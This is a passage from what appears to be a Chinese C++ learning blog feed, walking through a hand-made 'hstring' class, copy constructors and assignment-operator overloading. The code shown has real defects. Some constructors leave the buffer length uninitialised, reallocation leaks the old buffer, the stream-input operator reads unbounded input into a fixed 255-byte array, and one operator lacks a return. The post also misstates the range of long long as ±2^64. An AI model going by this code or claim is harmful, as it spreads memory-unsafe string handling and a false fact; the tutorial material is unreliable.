class="built_in">hstring</span>(<span class="type">char</span> ch=<span class="number">0x32</span>)&#123;</span><br><span class="line">    hsmLen = ch;                <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">0</span>;                    <span class="comment">//length = 0</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str):<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str);</span><br><span class="line">&#125;</span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str):<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">&#125;</span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>&lt;&lt;(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(str.c_str);       </span><br><span class="line">    len += hsLen - <span class="number">1</span>;               <span class="comment">//因为字符串\0结尾，两个字符串长度相加有一个\0就行</span></span><br><span class="line">    <span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;             <span class="comment">//清理内存</span></span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];      <span class="comment">//重新分配字符串空间</span></span><br><span class="line">        hsmLen = len;               <span class="comment">//重置缓冲区长度</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;c_str  + hsLen <span class="number">-1</span>, str.c_str, len - hsLen + <span class="number">1</span>);</span><br><span class="line">    hsLen = len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>+(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span> &lt;&lt; str;</span><br><span class="line">&#125;</span><br><span class="line">hstring::~<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> (c_str != <span class="literal">nullptr</span>) <span class="keyword">delete</span>[] c_str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">hstring::gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (str[len++] != <span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hstring::copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(source);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;</span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];        <span class="comment">//如果字符串的长度大于缓冲区就重新设置</span></span><br><span class="line">        hsmLen = len;                <span class="comment">//重置内存长度</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(c_str, source, len);</span><br><span class="line">    hsLen = len;                    <span class="comment">//重置字符串长度</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;_cout, hstring _str)&#123;</span><br><span class="line">    _cout &lt;&lt; _str.<span class="built_in">rtstr</span>();</span><br><span class="line">    <span class="keyword">return</span> _cout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::istream &amp;<span class="keyword">operator</span>&gt;&gt;(std::istream &amp;_cin, hstring &amp;_str)&#123;</span><br><span class="line">    <span class="type">char</span> _len[<span class="number">0xff</span>];</span><br><span class="line">    _cin &gt;&gt; _len;</span><br><span class="line">    _str = _len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _cin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>字符串最重要的就是缓冲区的问题，尽量减少内存分配浪费的时间和内存。<br>同时也要注意安全。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>赋值运算符重载</title>
      <link href="/2022/06/25/operator1/"/>
      <url>/2022/06/25/operator1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在类的几个默认构造函数中，有一个拷贝用的，也叫副本构造。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>默认的副本构造形式大概就是<code>Box(const Box&amp; box): x&#123; box.x &#125;, y&#123; box.y &#125;&#123; &#125;</code><br>这也是为什么初始化的时候，<code>Box b2(b1)</code>是合法的。</p><span id="more"></span><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Box b1, b2;</span><br><span class="line">b1.x = <span class="number">10</span>;</span><br><span class="line">b1.y = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">b2 = b1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 b2 &#x3D; b1 本质上就是因为运算符重载可以看到</p><img src="/2022/06/25/operator1/000.png" class=""><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>自己手写这个赋值运算符重载也不难</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">Box</span>()&#123;&#125;</span><br><span class="line"><span class="built_in">Box</span>(<span class="type">const</span> Box &amp;box) : x&#123; box.x &#125;, y&#123; box.y &#125;&#123;&#125;</span><br><span class="line">Box&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Box &amp;box);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Box&amp; Box::<span class="keyword">operator</span>=(<span class="type">const</span> Box &amp;box)&#123;</span><br><span class="line">x = box.x;</span><br><span class="line">y = box.y;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/25/operator1/001.png" class=""><p>能够看到调用的是我们自己写的一个运算符重载。<br>虽然有些时候当成员变量很多的时候，没必要手动敲，就让生成默认的就行了。</p><p>c++的引用特性是个好东西，可以一定程度上节约内存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Box Box::<span class="keyword">operator</span>=(<span class="type">const</span> Box &amp;box)&#123;</span><br><span class="line">x = box.x;</span><br><span class="line">y = box.y;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果函数返回值不是一个引用，那么每次都要构造一个临时变量充当，重复的过程多了，就会造成内存开销。</p><hr><h2 id="为什么要自定义"><a href="#为什么要自定义" class="headerlink" title="为什么要自定义"></a>为什么要自定义</h2><p>在某些情况下，希望类的某些值，通过特定方式去获取。那么就要打破常规，使用自定义的运算符重载。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *c_str;<span class="comment">//hstring =&gt; char *c_str</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hsLen;<span class="comment">//c_str length</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">hstring</span>();</span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span>* str);</span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> hstring&amp; str);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">rtstr</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> c_str; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>拿之前hstring为例。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str)&#123;</span><br><span class="line">c_str = (<span class="type">char</span> *)str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    hstring str&#123; <span class="string">&quot;123456&quot;</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然现在初始化的时候是<code>const char*</code>的常量<br>但是如果传入一个变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> strA[]&#123; <span class="string">&quot;aaabbbccc&quot;</span> &#125;;</span><br><span class="line">hstring str&#123; strA &#125;;</span><br></pre></td></tr></table></figure><blockquote><p>当strA被改变时，str也会随之改变，因为本质上我们套的是char*，是传入参数的指针。</p></blockquote><p>因此，要给hstring设置独立的属性</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *c_str;<span class="comment">//hstring =&gt; char *c_str</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hsLen;<span class="comment">//c_str length</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hsmLen;<span class="comment">//hstring 内存长度</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>;<span class="comment">//hsLen属于私有成员，故此调用函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">hstring</span>();</span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str);</span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">rtstr</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> c_str; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>()&#123;</span><br><span class="line">hsmLen = <span class="number">0x32</span>;<span class="comment">//设置缓冲区</span></span><br><span class="line">hsLen = <span class="number">0</span>;<span class="comment">//length = 0</span></span><br><span class="line">c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在现有手段上，增加一个缓冲区，用来应对小内存的时候不用频繁的申请。<br>当然缺点是每生成一个所占的内存比较高。</p><p>然后稍微设计全一点：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *c_str;<span class="comment">//hstring =&gt; char *c_str</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hsLen;<span class="comment">//c_str length</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hsmLen;<span class="comment">//hstring 内存长度</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>;<span class="comment">//hsLen属于私有成员，故此调用函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">hstring</span>();</span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str);</span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">rtstr</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> c_str; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>()&#123;</span><br><span class="line">hsmLen = <span class="number">0x32</span>;<span class="comment">//设置缓冲区</span></span><br><span class="line">hsLen = <span class="number">0</span>;<span class="comment">//length = 0</span></span><br><span class="line">c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str)&#123;</span><br><span class="line"> <span class="built_in">copyStrs</span>(c_str, str);</span><br><span class="line">&#125;</span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line"><span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">hstring::gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (str[len++] != <span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hstring::copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(source);</span><br><span class="line"><span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">c_str = <span class="keyword">new</span> <span class="type">char</span>[len];<span class="comment">//如果字符串的长度大于缓冲区就重新设置</span></span><br><span class="line">hsmLen = len;<span class="comment">//重置内存长度</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(c_str, source, len);</span><br><span class="line">hsLen = len;<span class="comment">//重置字符串长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/25/operator1/002.png" class=""><p>可以看到两种构造重载模式，一种是利用char*的字符串，另一种是传入一个hstring</p><p>即便是修改了原strA的值，也不会对后面的造成影响</p><img src="/2022/06/25/operator1/003.png" class=""><p>然后在给他来个赋值运算符重载</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hstring &amp;<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str);</span><br><span class="line"></span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line"><span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/25/operator1/004.png" class=""><p>发现赋值运算符重载没有问题</p><img src="/2022/06/25/operator1/005.png" class=""><p><strong>注意，当&#x3D;用在初始化时，调用的必定是副本构造函数，因为类还未被实例化，没有内存，而当你已经实例化之后，&#x3D;就是一种赋值运算符重载</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hstring str3 = <span class="string">&quot;我不说你不说&quot;</span>;</span><br></pre></td></tr></table></figure><p>这种实例化对象的时候，因为我们没有主动重写副本构造函数，所以它调用的是默认的副本构造函数。</p><img src="/2022/06/25/operator1/006.png" class=""><p>当右值对象类型没有在类中有匹配的地方时，编译器会自动创建一个临时变量用以类型转换。所以没必要再写一个char*的运算符重载，即：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hstring &amp;<span class="keyword">operator</span>=(<span class="type">const</span> <span class="type">char</span> *str);</span><br><span class="line"></span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>=(<span class="type">const</span> <span class="type">char</span> *str)&#123;</span><br><span class="line"><span class="built_in">copyStrs</span>(c_str, str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="封装一下"><a href="#封装一下" class="headerlink" title="封装一下"></a>封装一下</h2><p>分文件的重要性</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hstring.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *c_str;<span class="comment">//hstring =&gt; char *c_str</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hsLen;<span class="comment">//c_str length</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hsmLen;<span class="comment">//hstring 内存长度</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>;<span class="comment">//hsLen属于私有成员，故此调用函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">hstring</span>();</span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str);</span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">hstring &amp;<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">rtstr</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> c_str; &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hstring.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hstring.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>()&#123;</span><br><span class="line">hsmLen = <span class="number">0x32</span>;<span class="comment">//设置缓冲区</span></span><br><span class="line">hsLen = <span class="number">0</span>;<span class="comment">//length = 0</span></span><br><span class="line">c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str)&#123;</span><br><span class="line"><span class="built_in">copyStrs</span>(c_str, str);</span><br><span class="line">&#125;</span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line"><span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">&#125;</span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line"><span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">hstring::gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (str[len++] != <span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hstring::copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(source);</span><br><span class="line"><span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">c_str = <span class="keyword">new</span> <span class="type">char</span>[len];<span class="comment">//如果字符串的长度大于缓冲区就重新设置</span></span><br><span class="line">hsmLen = len;<span class="comment">//重置内存长度</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(c_str, source, len);</span><br><span class="line">hsLen = len;<span class="comment">//重置字符串长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>转换一个longlong类型的数据为hstring</p><p>其实也不太靠谱，用的以前c语言的库函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hstring &amp;<span class="keyword">operator</span>=(<span class="type">const</span> <span class="type">long</span> <span class="type">long</span> &amp;value);</span><br><span class="line"></span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>=(<span class="type">const</span> <span class="type">long</span> <span class="type">long</span> &amp;value)&#123;</span><br><span class="line"><span class="type">char</span> ch[<span class="number">0x32</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(ch, <span class="string">&quot;%lld&quot;</span>, value);</span><br><span class="line"><span class="built_in">copyStrs</span>(c_str,ch);</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且因为sprintf在vs中被认为是不安全的函数，所以要再头文件之上加一句屏蔽的<br><code>#define _CRT_SECURE_NO_WARNINGS</code></p><p>最后效果就是这样</p><img src="/2022/06/25/operator1/007.png" class=""><blockquote><p>这么操作肯定是有问题的，虽然说long long占用8字节<br>它的范围也就是-2^64 - 2^64-1 十进制也就是-9223372036854775808 至 9223372036854775807<br>不过好在位数上没有超过。<br>利用已有的函数实现虽然有点偷懒，但是能完成也不错。</p></blockquote><p>还有个问题，就是正负数，要不要保留这个符号位。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>简单玩玩<br>主要区分初始化类时<code>=</code>和重新赋值<code>=</code>的区别。<br>前者为副本构造函数又称拷贝函数，后者乃是运算符重载的问题。</p><p>这里其实有点小坑~下一章会写出来</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运算符重载</title>
      <link href="/2022/06/25/operator/"/>
      <url>/2022/06/25/operator/</url>
      
